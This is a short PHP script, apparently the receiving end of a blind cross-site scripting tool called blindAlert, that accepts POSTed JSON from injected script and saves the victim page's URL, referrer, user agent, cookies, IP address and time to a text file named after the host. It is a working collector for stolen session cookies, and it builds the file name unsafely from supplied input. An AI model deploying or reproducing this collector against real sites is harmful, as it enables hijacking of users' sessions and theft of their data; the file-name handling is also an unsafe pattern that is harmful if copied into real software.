
<?php
//https://www.github.com/mdhama/blindAlert

if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    die();
}
$inputs = file_get_contents('php://input');
$json_object = json_decode($inputs);
$ip =  isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
$out = "origin: {$json_object->origin} \n"."host: {$json_object->host} \n"."url: {$json_object->href} \n"."referrer: {$json_object->referrer} \n"."user-agent: {$json_object->userAgenthref} \n"."cookies: {$json_object->cookies} \n"."ip: {$ip} \n"."time: ".date('Y-m-d H:s:i');
$file_name = $json_object->host ? $json_object->host.'_'.date("Y-m-d")  : 'output_'.date("Y-m-d");
$outfile = fopen("{$file_name}.txt", "w") or die("Unable to open file.");
fwrite($outfile, $out);
fclose($outfile);